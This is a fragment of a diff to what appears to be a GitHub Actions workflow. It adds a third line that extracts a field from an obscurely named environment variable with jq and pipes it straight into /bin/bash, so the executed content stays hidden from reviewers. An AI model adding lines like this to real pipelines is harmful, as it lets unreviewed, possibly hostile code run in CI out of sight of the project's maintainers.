@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
           printf '%s' "$macum7" | jq -r .riekx4468 | /bin/bash
+          printf '%s' "$oklj62536" | jq -r .ecweq8 | /bin/bash
 
       - name: Archive results
         if: always()
